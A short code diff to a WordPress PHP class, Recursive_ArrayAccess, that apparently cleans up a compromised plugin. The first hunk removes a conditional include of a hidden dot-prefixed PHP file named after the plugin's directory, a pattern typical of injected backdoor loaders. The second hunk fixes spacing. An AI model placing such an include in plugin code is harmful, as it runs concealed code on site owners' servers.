@@ -16,10 +16,6 @@
  * @package WordPress
  * @since 3.7.0
  */
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 class Recursive_ArrayAccess implements ArrayAccess, Iterator, Countable {
 	/**
 	 * Internal data collection.
@@ -86,7 +82,7 @@ class Recursive_ArrayAccess implements ArrayAccess, Iterator, Countable {
 	 * @return boolean true on success or false on failure.
 	 */
 	public function offsetExists( $offset ) {
-		return isset( $this->container[ $offset ]) ;
+		return isset( $this->container[ $offset ] );
 	}
 
 	/**
